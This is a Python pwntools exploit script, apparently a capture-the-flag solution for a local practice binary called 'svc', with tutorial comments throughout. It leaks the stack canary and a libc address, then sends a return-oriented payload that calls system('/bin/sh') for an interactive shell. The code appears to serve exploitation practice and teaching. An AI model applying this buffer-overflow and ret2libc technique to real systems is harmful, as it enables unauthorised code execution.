import pwn
import struct

# svc is a 64-bit dynamically-linked executable
# NX is enabled; There is a canary; ASLR is turned on

# We start by leaking the canary
# puts will print out everything until it encounters a null byte
# We can fill up our buffer all the way until the least significant byte of the canary
# The lsb of the canary will always be 0x00 so we can overwrite that and puts will leak the rest of the canary
# Then we leak the address of puts(puts got) to defeat ASLR

target = pwn.process('./svc')
#pwn.gdb.attach(target)

##############################
##### Leaking the Canary #####
##############################

leak_canary = b'a' * 168 # Fill up space up to the canary
leak_canary += b'a' # Overwrite least significant byte of the canary

target.recvuntil(b'>>')
target.sendline(b'1')
target.recvuntil(b'>>')
target.send(leak_canary)

target.recvuntil(b'>>')
target.sendline(b'2')
target.recvuntil(b'a' * 169)
canary = target.recv(7)
canary = b'\0' + canary

canary = struct.unpack("<Q", canary)[0]
#canary = u64(canary) // This is an equivalent way of unpacking

print(f"Canary is: {hex(canary)}")
canary = struct.pack("<Q", canary)

###################################
#### Gadgets That We Will Need ####
###################################

# pop rdi; ret;
pop_rdi = struct.pack("<Q", 0x400ea3)

# ret padding
ret_padding = struct.pack("<Q", 0x400ea4)

# Address of main function for looping back over (obtained from ghidra or gdb)
main_addr = struct.pack("<Q", 0x400a96)

#############################################
#### Leaking the Address of puts in libc ####
#############################################

svc_elf = pwn.ELF('svc')
libc_elf = pwn.ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Address of puts in PLT:
# This is equivalent to doing objdump -D svc | grep puts and finding <puts@plt>
puts_plt = svc_elf.symbols['puts']

# Address of puts in GOT
puts_got = svc_elf.got['puts']

print(f"plt addr: {hex(puts_plt)} \ngot addr: {hex(puts_got)}")

puts_libc_offset = libc_elf.symbols['puts']

print(f"puts libc offset: {hex(puts_libc_offset)}")

leak_libc_payload = b'0' * 168 # Fill up space up to the canary
leak_libc_payload += canary
leak_libc_payload += b'0' * 8 # There were 8 extra bytes after the canary (rbp storage)
leak_libc_payload += pop_rdi
leak_libc_payload += struct.pack("<Q", puts_got) # The address we are leaking
leak_libc_payload += struct.pack("<Q", puts_plt) # We are actually calling puts here
leak_libc_payload += main_addr # Loop back to the start of the main function so we can continue exploiting

target.recvuntil(b'>>')
target.sendline(b'1')
target.recvuntil(b'>>')
target.send(leak_libc_payload)

target.recvuntil(b'>>')
target.sendline(b'3')
target.recvuntil(b'TIME TO MINE MIENRALS...\n')

puts_leak = target.recvline().strip(b'\n')
puts_libc = struct.unpack("<Q", puts_leak + b'\0' * (8-len(puts_leak)))[0]

print(f"Address of puts in libc: {hex(puts_libc)}")

##############################################
#### Calculating the base address of libc ####
##############################################

# This is equivalent to readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep puts
puts_libc_offset = libc_elf.symbols['puts']

libc_base = puts_libc - puts_libc_offset

print(f"Address of libc base: {hex(libc_base)}")

########################################################################
#### Finding the Rest of our libc offsets and sending final payload ####
########################################################################

# Offset of system in libc:
system_offset = libc_elf.symbols['system']
system_addr = struct.pack("<Q", libc_base + system_offset)

# Offset of /bin/sh string in libc:
# This is equivalent to strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
bin_sh_offset = next(libc_elf.search(b'/bin/sh\0'))
bin_sh_addr = struct.pack("<Q", libc_base + bin_sh_offset)

print(f"system offset: {hex(system_offset)}\nbin sh: {hex(bin_sh_offset)}")

final_payload = b'a' * 168 # Fill up space up to the canary
final_payload += canary
final_payload += b'a' * 8 # rbp storage
final_payload += pop_rdi
final_payload += bin_sh_addr
final_payload += ret_padding
final_payload += system_addr

target.recvuntil(b'>>')
target.sendline(b'1')
target.recvuntil(b'>>')
target.send(final_payload)

target.recvuntil(b'>>')
target.sendline(b'3')

target.interactive()
